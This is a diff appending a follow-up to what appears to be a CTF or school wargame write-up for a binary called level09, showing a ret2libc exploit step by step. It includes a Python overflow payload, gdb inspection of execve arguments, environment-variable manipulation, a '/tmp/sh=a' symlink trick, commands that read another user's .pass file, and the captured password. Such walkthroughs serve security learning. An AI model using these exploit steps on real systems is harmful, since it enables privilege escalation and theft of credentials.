@@ -448,3 +448,46 @@ EXPLOIT
 	end
 => cat /home/users/end/.pass
 	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+
+# After finishing the project, I got the chance to talk to the project creator about the ret2libc above
+# He told me there were other ways to exploit this binary so I looked deeper
+=>  python -c 'print "a"*40 + "\xd0" + "\n" + "b"*200 + "\x9a\xe1\xaf\xf7\xff\x7f\x00\x00"' > /tmp/a
+=> b *main+16
+=> r < /tmp/a
+=> b *0x7ffff7afe1b3
+	# Right before execve call
+=> c
+=> x/s $rdi
+	0x7ffff7b94d0f:	 "/bin/sh"
+=> x/xg $rsi
+	0x7fffffffe600:	0x00007fffffffe8d8
+	=> x/s 0x00007fffffffe8d8
+		0x7fffffffe8d8:	 "LS_COLORS=...
+	# rsi is not ok, it points somewhere in our env
+=> x/xg $rdx
+	0x7fffffffe5b8:	0x00007fffffffe816
+	=> x/s 0x00007fffffffe816
+		0x7fffffffe816:	 "LC_PAPER=fr_FR.UTF-8"
+=> show env
+	LC_PAPER=fr_FR.UTF-8
+	...
+	# rdx is ok
+# rdx is the only one which doesnt work but it points to the env, I can change it
+# I need to overwrite LS_COLORS memory address when setting up the env
+=> env -u LC_TELEPHONE -u LS_COLORS -u PATH -u MAIL -u LC_IDENTIFICATION -u PWD -u LANG -u LC_MEASUREMENT -u HOME -u SHLVL -u LANGUAGE -u LOGNAME -u SSH_CONNECTION -u LESSOPEN -u LC_TIME -u LESSCLOSE -u LC_NAME -u OLDPWD -u _ '/bin/sh'=a ''=a ./level09 < /tmp/a
+	 /bin/sh=a: 0: Can't open =a
+=> /bin/sh aaa=a
+	/bin/sh: 0: Can't open aaa=a
+# It opens "/bin/sh=a" and tries to open "=a" but we can see the command being executed
+# I need to create something that looks like "/bin/sh=a"
+# The following string must look like "aaa=aaa"
+=> ln -s /bin/sh '/tmp/sh=a'
+=> ls -l /tmp
+	lrwxrwxrwx 1 level09  level09   7 Nov 11 17:16 sh=a -> /bin/sh
+=> echo 'whoami && echo && cat /home/users/end/.pass' > '/tmp/pass=a'
+=> cat pass\=a
+	whoami && echo && cat /home/users/end/.pass
+=> env -u LC_TELEPHONE -u LS_COLORS -u PATH -u MAIL -u LC_IDENTIFICATION -u PWD -u LANG -u LC_MEASUREMENT -u HOME -u SHLVL -u LANGUAGE -u LOGNAME -u SSH_CONNECTION -u LESSOPEN -u LC_TIME -u LESSCLOSE -u LC_NAME -u OLDPWD -u _ '/tmp/sh'='a' '/tmp/pass'=a ./level09 < /tmp/a
+	end
+	j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
+# Indeed it was possible to exploit it with a ret2libc
